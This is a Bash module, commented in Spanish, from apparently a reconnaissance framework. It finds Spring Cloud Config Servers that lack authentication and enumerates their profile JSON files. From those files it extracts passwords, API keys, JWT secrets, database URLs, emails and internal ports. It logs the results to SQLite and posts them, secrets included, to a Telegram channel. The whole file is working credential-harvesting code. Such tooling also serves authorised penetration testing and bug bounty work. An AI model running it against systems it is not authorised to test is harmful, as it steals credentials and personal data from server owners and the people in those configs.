#!/usr/bin/env bash
# ============================================================
#  modules/30_spring_config.sh
#  Fase 30: Spring Cloud Config Server scanner
#
#  Técnicas:
#    - Fingerprint vía actuator content-type
#      (application/vnd.spring-boot.actuator.v3+json)
#    - Enumeración de perfiles: application-{default,production,
#      staging,prod,dev,test,local}.json
#    - Formato antiguo: /{app}/{profile}
#    - Extracción de secrets: API keys, passwords, JWT secrets,
#      DB URLs, OAuth client secrets
#    - Contraste service-specific (401) vs application (200)
#      para confirmar misconfiguration targeted
#    - Extracción de PII: emails embebidos en config
#    - Mapa de microservicios internos (localhost ports)
#
#  Referencias:
#    - Spring Cloud Config Server docs (unauthenticated exposure)
#    - CVE-2020-5410 (path traversal en config server)
#    - guru.dcu.ie case (2026-05-03)
# ============================================================

MODULE_NAME="spring_config"
MODULE_DESC="Spring Cloud Config Server scanner"

# ── Perfiles a probar ─────────────────────────────────────────
_CONFIG_PROFILES=(default production staging prod dev test local)

# ── Nombres de app a probar además de "application" ──────────
_CONFIG_APPS=(application app service backend api gateway)

# ── Fingerprint: ¿es un Spring Cloud Config Server? ──────────
_is_config_server() {
  local HOST="$1"  # https://host

  local CT
  CT=$(curl -sI --max-time 8 "${HOST}/actuator/health" 2>/dev/null \
    | grep -i "content-type:" | tr -d '\r')

  echo "$CT" | grep -qi "spring-boot.actuator" && return 0

  # Fallback: /actuator/info con build.name que contenga "config"
  local INFO
  INFO=$(curl -s --max-time 8 "${HOST}/actuator/info" 2>/dev/null)
  echo "$INFO" | grep -qi '"config' && return 0
  echo "$INFO" | grep -qi 'config-service' && return 0

  return 1
}

# ── Extraer secrets de un JSON de config ─────────────────────
_extract_config_secrets() {
  local JSON="$1"

  python3 - "$JSON" << 'PYEOF'
import sys, json, re

def flatten(obj, prefix=""):
    items = {}
    if isinstance(obj, dict):
        for k, v in obj.items():
            items.update(flatten(v, f"{prefix}.{k}" if prefix else k))
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            items.update(flatten(v, f"{prefix}[{i}]"))
    else:
        items[prefix] = obj
    return items

try:
    data = json.loads(sys.argv[1])
except Exception:
    sys.exit(1)

flat = flatten(data)

SECRET_PATTERNS = re.compile(
    r'(password|passwd|secret|api[_\-]?key|apikey|token|credential|auth[_\-]?key'
    r'|client[_\-]?secret|signing[_\-]?key|jwt[_\-]?secret|private[_\-]?key'
    r'|ethos[_\-]?api|access[_\-]?key|encryption[_\-]?key|db[_\-]?pass'
    r'|database[_\-]?pass|datasource)',
    re.IGNORECASE
)

EMAIL_PATTERN = re.compile(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}')
URL_PATTERN   = re.compile(r'(jdbc:|mongodb://|redis://|amqp://|postgresql://)', re.IGNORECASE)
PORT_PATTERN  = re.compile(r'localhost:\d{2,5}')

secrets = []
emails  = []
db_urls = []
ports   = []

ZERO_UUID = "00000000-0000-0000-0000-000000000000"

for key, val in flat.items():
    if not isinstance(val, str):
        continue
    if SECRET_PATTERNS.search(key):
        if val and val != ZERO_UUID and len(val) > 3:
            secrets.append(f"{key} = {val}")
    if EMAIL_PATTERN.search(str(val)):
        for m in EMAIL_PATTERN.finditer(str(val)):
            emails.append(m.group(0))
    if URL_PATTERN.search(str(val)):
        db_urls.append(f"{key} = {val}")
    for m in PORT_PATTERN.finditer(str(val)):
        ports.append(f"{key}: {m.group(0)}")

if secrets:
    print("SECRETS:" + "||".join(secrets[:20]))
if emails:
    print("EMAILS:" + "||".join(list(set(emails))[:20]))
if db_urls:
    print("DB_URLS:" + "||".join(db_urls[:10]))
if ports:
    print("PORTS:" + "||".join(list(set(ports))[:15]))
PYEOF
}

# ── Probar un config server ───────────────────────────────────
_scan_config_server() {
  local HOST="$1"        # https://config.example.com
  local DOMAIN_ID="$2"
  local DOMAIN="$3"
  local PROXY_FLAG="$4"

  log_info "  [spring_config] Probando: $HOST"

  # Confirmar que es un config server
  if ! _is_config_server "$HOST"; then
    log_info "  [spring_config] No es config server: $HOST"
    return
  fi

  log_warn "  ⚙️  Config server confirmado: $HOST"

  # Intentar obtener info de build
  local BUILD_INFO
  BUILD_INFO=$(curl -s --max-time 8 "${HOST}/actuator/info" 2>/dev/null \
    | python3 -c "
import sys, json
try:
    d = json.loads(sys.stdin.read())
    b = d.get('build', {})
    print(f\"{b.get('name','?')} v{b.get('version','?')}\")
except Exception:
    print('unknown')
" 2>/dev/null || echo "unknown")

  local FOUND_PROFILES=()
  local BEST_JSON=""
  local BEST_SIZE=0

  # Probar todos los perfiles para todas las apps
  for APP in "${_CONFIG_APPS[@]}"; do
    for PROFILE in "${_CONFIG_PROFILES[@]}"; do
      local URL="${HOST}/${APP}-${PROFILE}.json"
      local STATUS SIZE BODY

      BODY=$(curl -s --max-time 10 ${PROXY_FLAG} \
        -w "\n###STATUS###%{http_code}\n###SIZE###%{size_download}" \
        "$URL" 2>/dev/null)
      STATUS=$(echo "$BODY" | grep -oP '(?<=###STATUS###)\d+')
      SIZE=$(echo "$BODY"   | grep -oP '(?<=###SIZE###)\d+')
      BODY=$(echo "$BODY"   | grep -v '###STATUS###' | grep -v '###SIZE###')

      if [[ "$STATUS" == "200" && "${SIZE:-0}" -gt 100 ]]; then
        FOUND_PROFILES+=("${APP}-${PROFILE} (${SIZE}B)")
        # Guardar el más grande para extracción
        if [[ "${SIZE:-0}" -gt "$BEST_SIZE" ]]; then
          BEST_SIZE="${SIZE:-0}"
          BEST_JSON="$BODY"
        fi
      fi
    done
    # Si encontramos el app principal ya no seguimos con variantes
    [[ ${#FOUND_PROFILES[@]} -gt 0 && "$APP" == "application" ]] && break
  done

  if [[ ${#FOUND_PROFILES[@]} -eq 0 ]]; then
    log_info "  [spring_config] Sin perfiles expuestos en $HOST"
    return
  fi

  local PROFILES_STR
  PROFILES_STR=$(IFS=', '; echo "${FOUND_PROFILES[*]}")
  log_warn "  ⚡ Config profiles expuestos: $PROFILES_STR"

  # Verificar que configs de servicios SÍ requieren auth
  # (confirma misconfiguration targeted, no blanket open)
  local SVC_STATUS
  SVC_STATUS=$(curl -s --max-time 8 ${PROXY_FLAG} \
    -o /dev/null -w "%{http_code}" \
    "${HOST}/users-service/default.json" 2>/dev/null)
  local TARGETED_DETAIL=""
  if [[ "$SVC_STATUS" == "401" || "$SVC_STATUS" == "403" ]]; then
    TARGETED_DETAIL=" | Service-specific configs requieren auth ($SVC_STATUS) — misconfiguration targeted"
  fi

  # Extraer secrets del JSON más grande encontrado
  local EXTRACT_OUT=""
  local SEVERITY="medium"
  local SECRET_COUNT=0

  if [[ -n "$BEST_JSON" ]]; then
    EXTRACT_OUT=$(_extract_config_secrets "$BEST_JSON")
    SECRET_COUNT=$(echo "$EXTRACT_OUT" | grep -c "^SECRETS:" || true)

    # Subir severity si encontramos credenciales reales
    if echo "$EXTRACT_OUT" | grep -qE "^(SECRETS:|DB_URLS:)"; then
      SEVERITY="high"
    fi
    if echo "$EXTRACT_OUT" | grep -qiE "(password|passwd|secret|jwt)" && \
       ! echo "$EXTRACT_OUT" | grep -qiE "00000000-0000-0000-0000-000000000000"; then
      SEVERITY="high"
    fi
  fi

  # Construir detalle del finding
  local DETAIL="Spring Cloud Config Server sin autenticación"
  DETAIL+=" | Build: ${BUILD_INFO}"
  DETAIL+=" | Perfiles: ${PROFILES_STR}"
  DETAIL+="$TARGETED_DETAIL"

  local SECRETS_SUMMARY=""
  local EMAILS_SUMMARY=""
  local PORTS_SUMMARY=""
  local DBURLS_SUMMARY=""

  if [[ -n "$EXTRACT_OUT" ]]; then
    SECRETS_SUMMARY=$(echo "$EXTRACT_OUT" | grep "^SECRETS:" | sed 's/^SECRETS://' | tr '||' '\n' | head -5 | tr '\n' ' ')
    EMAILS_SUMMARY=$(echo "$EXTRACT_OUT"  | grep "^EMAILS:"  | sed 's/^EMAILS://'  | tr '||' '\n' | head -5 | tr '\n' ' ')
    PORTS_SUMMARY=$(echo "$EXTRACT_OUT"   | grep "^PORTS:"   | sed 's/^PORTS://'   | tr '||' '\n' | head -5 | tr '\n' ' ')
    DBURLS_SUMMARY=$(echo "$EXTRACT_OUT"  | grep "^DB_URLS:" | sed 's/^DB_URLS://' | tr '||' '\n' | head -3 | tr '\n' ' ')
    [[ -n "$SECRETS_SUMMARY" ]] && DETAIL+=" | Secrets: ${SECRETS_SUMMARY}"
    [[ -n "$DBURLS_SUMMARY"  ]] && DETAIL+=" | DB URLs: ${DBURLS_SUMMARY}"
  fi

  # Deduplicar: no reportar si ya existe finding para este host
  local BEFORE
  BEFORE=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID} AND target='${HOST//\'/\'\'}' AND type='spring_config';" \
    2>/dev/null || echo "1")

  if [[ "${BEFORE:-1}" == "0" ]]; then
    db_add_finding "$DOMAIN_ID" "spring_config" "$SEVERITY" \
      "$HOST" "config_server_unauth" "$DETAIL"

    local TG_MSG="⚙️ *Spring Cloud Config Server expuesto*
🌐 \`${DOMAIN}\`
🔗 \`${HOST}\`
📋 Severidad: \`${SEVERITY^^}\`
📦 Build: \`${BUILD_INFO}\`
📂 Perfiles: \`${PROFILES_STR}\`"
    [[ -n "$SECRETS_SUMMARY" ]] && TG_MSG+="
🔑 Secrets: \`${SECRETS_SUMMARY:0:200}\`"
    [[ -n "$EMAILS_SUMMARY"  ]] && TG_MSG+="
📧 Emails: \`${EMAILS_SUMMARY:0:150}\`"
    [[ -n "$PORTS_SUMMARY"   ]] && TG_MSG+="
🖥️ Internal ports: \`${PORTS_SUMMARY:0:150}\`"
    [[ -n "$DBURLS_SUMMARY"  ]] && TG_MSG+="
🗄️ DB URLs: \`${DBURLS_SUMMARY:0:150}\`"
    TG_MSG+="
📅 $(date '+%Y-%m-%d %H:%M:%S')"

    _telegram_send "$TG_MSG" 2>/dev/null || true
  fi

  # Log extracted intel
  [[ -n "$SECRETS_SUMMARY" ]] && log_warn "    🔑 Secrets: $SECRETS_SUMMARY"
  [[ -n "$EMAILS_SUMMARY"  ]] && log_warn "    📧 Emails:  $EMAILS_SUMMARY"
  [[ -n "$PORTS_SUMMARY"   ]] && log_warn "    🖥️  Ports:   $PORTS_SUMMARY"
  [[ -n "$DBURLS_SUMMARY"  ]] && log_warn "    🗄️  DB URLs: $DBURLS_SUMMARY"
}

# ── Candidatos: encontrar posibles config servers ─────────────
_find_candidates() {
  local DOMAIN_ID="$1"
  local DOMAIN="$2"
  local OUT_DIR="$3"

  local CANDS="$OUT_DIR/.spring_config_cands.txt"
  > "$CANDS"

  # 1. Subdominios alive con prefijo config*, spring*, vault*
  if [[ -s "$OUT_DIR/subs_alive.txt" ]]; then
    grep -iE "^(config|spring|config-service|configserver|vault)\." \
      "$OUT_DIR/subs_alive.txt" 2>/dev/null \
      | sed 's|^|https://|' >> "$CANDS" || true
  fi

  # 2. Subdominios en DB con esas palabras
  sqlite3 "$DB_PATH" \
    "SELECT DISTINCT 'https://' || subdomain FROM subdomains
     WHERE domain_id=${DOMAIN_ID}
       AND (subdomain LIKE 'config.%' OR subdomain LIKE 'config-%'
            OR subdomain LIKE 'spring.%' OR subdomain LIKE 'configserver%'
            OR subdomain LIKE '%-config.%' OR subdomain LIKE '%config-service%')
       AND status='alive';" 2>/dev/null >> "$CANDS"

  # 3. Hosts con actuator ya detectado en tech DB
  sqlite3 "$DB_PATH" \
    "SELECT DISTINCT 'https://' || subdomain FROM technologies
     WHERE domain_id=${DOMAIN_ID}
       AND (tech_name LIKE '%Spring%' OR tech_name LIKE '%spring%');" \
    2>/dev/null >> "$CANDS"

  # 4. Hosts de la DB con URLs que contengan /actuator
  sqlite3 "$DB_PATH" \
    "SELECT DISTINCT 'https://' || replace(replace(url,'https://',''),'http://','')
     FROM urls
     WHERE domain_id=${DOMAIN_ID} AND url LIKE '%/actuator%';" \
    2>/dev/null \
    | sed 's|/actuator.*||' >> "$CANDS"

  sort -u "$CANDS" -o "$CANDS"
  echo "$CANDS"
}

module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 30 — $MODULE_DESC: $DOMAIN"

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  local CANDS_FILE
  CANDS_FILE=$(_find_candidates "$DOMAIN_ID" "$DOMAIN" "$OUT_DIR")

  local TOTAL
  TOTAL=$(wc -l < "$CANDS_FILE" | tr -d ' ')

  if [[ "$TOTAL" -eq 0 ]]; then
    log_info "Sin candidatos para Spring Config scan"
    rm -f "$CANDS_FILE"
    return
  fi

  log_info "Probando $TOTAL candidatos como Spring Cloud Config Server..."

  local PIDS=()
  while IFS= read -r HOST; do
    [[ -z "$HOST" ]] && continue
    (
      _scan_config_server "$HOST" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
    ) &
    PIDS+=($!)
    if [[ ${#PIDS[@]} -ge 5 ]]; then
      wait "${PIDS[0]}" 2>/dev/null || true
      PIDS=("${PIDS[@]:1}")
    fi
  done < "$CANDS_FILE"
  wait "${PIDS[@]}" 2>/dev/null || true

  rm -f "$CANDS_FILE"

  local FOUND
  FOUND=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID} AND type='spring_config';" \
    2>/dev/null || echo 0)
  log_ok "$MODULE_DESC completado: $FOUND config servers expuestos"
}
